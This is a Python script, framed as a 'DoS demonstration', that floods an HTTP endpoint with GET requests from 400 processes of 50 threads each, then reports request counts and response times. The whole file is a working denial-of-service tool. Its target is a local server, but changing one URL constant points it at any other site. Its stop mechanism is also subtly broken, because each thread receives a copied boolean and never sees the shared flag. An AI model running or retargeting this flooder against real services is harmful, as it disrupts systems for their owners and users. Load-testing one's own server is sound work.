import logging
import requests
import threading
import time
import statistics
import sys
import os
import signal
from requests.adapters import HTTPAdapter
from urllib3.util.retry import Retry
import multiprocessing
from multiprocessing import Event, Manager, Value, Array

# Configure colored logging
try:
    import colorlog
    
    handler = colorlog.StreamHandler()
    handler.setFormatter(colorlog.ColoredFormatter(
        '%(log_color)s%(asctime)s - %(message)s',
        log_colors={
            'INFO': 'green',
            'WARNING': 'yellow',
            'ERROR': 'red',
            'CRITICAL': 'red,bg_white',
        }
    ))
    
    logger = colorlog.getLogger()
    logger.setLevel(logging.INFO)
    logger.handlers = [handler]
except ImportError:
    # Fallback to standard logging if colorlog is not installed
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s - %(message)s',
        datefmt='%H:%M:%S'
    )
    logger = logging.getLogger()
    print("For colored logs, install colorlog: pip install colorlog")

# TARGET_URL = "http://127.0.0.1:8000"  # Change this to your local server's port
TARGET_URL = "http://localhost:8000/get_definition_service/?style=Shakespeare&word=get"  # Change this to your local server's port

# Statistics tracking
# request_count = 0  # Removed: Now using shared Value
# response_times = [] # Removed: Now using shared List
summary_interval = 100  # Significantly increased for less frequent summaries
lock = threading.Lock()  # Lock for thread-safe operations on shared variables

# Configure session with connection pooling
def create_session():
    session = requests.Session()
    
    # Configure retry strategy
    retry_strategy = Retry(
        total=3,
        backoff_factor=0.1,
        status_forcelist=[429, 500, 502, 503, 504],
    )
    
    # Configure adapter with larger pool size and longer keep-alive
    adapter = HTTPAdapter(
        pool_connections=100,  # Increase connection pool size
        pool_maxsize=100,      # Increase max size per host
        max_retries=retry_strategy
    )
    
    # Mount adapter to both http and https
    session.mount("http://", adapter)
    session.mount("https://", adapter)
    
    return session

# Create thread-local storage for sessions
thread_local = threading.local()

def get_session():
    if not hasattr(thread_local, "session"):
        thread_local.session = create_session()
    return thread_local.session

def send_requests(stop_flag_value, request_count, response_times):  # Pass stop_flag_value directly
    # Get thread-local session
    session = get_session()
    
    while not stop_flag_value:  # Use the passed value
        try:
            start_time = time.time()
            response = session.get(TARGET_URL)
            end_time = time.time()
            response_time = end_time - start_time
            
            with lock:
                request_count.value += 1  # Increment the shared request count
                response_times.append(response_time)  # Append to the shared response times
                
                # Log *only* on error status codes or at summary intervals
                if response.status_code >= 400 or request_count.value % summary_interval == 0:
                    if len(response_times) >= summary_interval: # Ensure enough data
                        avg_time = statistics.mean(response_times[-summary_interval:])
                        max_time = max(response_times[-summary_interval:])
                    else:
                        avg_time = statistics.mean(response_times)
                        max_time = max(response_times)

                    log_message = (f"Request #{request_count.value} | Status: {response.status_code} | "
                                   f"Last: {response_time:.4f}s | Avg: {avg_time:.4f}s | Max: {max_time:.4f}s")

                    if response.status_code >= 400:
                        logger.warning(log_message) # Use warning level for errors
                    else:
                        logger.info(log_message)

                if len(response_times) > 1000:
                    response_times[:] = response_times[-100:]  # Update the shared list

            # Add a small delay to prevent overwhelming the system
            time.sleep(0.01)

        except requests.exceptions.RequestException as e:
            logger.error(f"Request error: {e}")
            time.sleep(0.5)  # Back off on errors
        except Exception as e:
            logger.error(f"Unexpected error: {e}")
            time.sleep(0.5)  # Back off on errors

def start_process(stop_flag, request_count, response_times):
    # Launch multiple threads within each process
    NUM_THREADS = 50  # Number of threads per process
    threads = []

    for _ in range(NUM_THREADS):
        # Pass stop_flag.value, not stop_flag itself
        thread = threading.Thread(target=send_requests, args=(stop_flag.value, request_count, response_times))
        thread.daemon = True  # Set as daemon so they will exit when the main thread exits
        thread.start()
        threads.append(thread)

    # Keep the process running and join threads on exit
    while not stop_flag.value:
        time.sleep(0.1)

    # Join threads before process exits
    for thread in threads:
        thread.join()

def signal_handler(sig, frame):
    print("\nStopping attack. Please wait...")
    stop_flag.value = True  # Set the stop flag

# Global variable (will be set in main)
stop_flag = None

def main():
    global stop_flag  # Use the global stop_flag
    # Create a manager to share objects between processes
    manager = Manager()
    stop_flag = manager.Value('b', False)  # Shared boolean flag
    request_count = manager.Value('i', 0)  # Shared integer for request count
    response_times = manager.list()  # Shared list for response times

    print(f"Starting multi-threaded DoS demonstration against {TARGET_URL}")
    print("Press Ctrl+C to stop the attack\n")

    # Register the signal handler
    signal.signal(signal.SIGINT, signal_handler)

    # Launch multiple processes
    NUM_PROCESSES = 400  # Number of processes to create
    processes = []

    for _ in range(NUM_PROCESSES):
        process = multiprocessing.Process(target=start_process, args=(stop_flag, request_count, response_times))
        process.daemon = True  # Set as daemon so they will exit when the main process exits
        process.start()
        processes.append(process)

    # Keep the main process alive (signal handler will interrupt)
    while not stop_flag.value:
        time.sleep(1)

    # Simplified process termination
    for process in processes:
        process.join(timeout=5)  # Give processes time to exit
        if process.is_alive():
            print(f"Force terminating process {process.pid}")
            process.terminate()
            process.join(1) # Short join after terminate
            if process.is_alive():
                process.kill() # Last resort

    # Final statistics (check if response_times is not empty)
    try:
        if response_times:
            avg_time = statistics.mean(response_times)
            max_time = max(response_times)
        else:
            avg_time = 0
            max_time = 0
    except statistics.StatisticsError:
        avg_time = 0
        max_time = 0
        
    print("\n" + "="*50)
    print(f"Attack Summary:")
    print(f"Total Requests: {request_count.value}")
    print(f"Average Response Time: {avg_time:.4f}s")
    print(f"Maximum Response Time: {max_time:.4f}s")
    print("="*50)

if __name__ == "__main__":
    main()
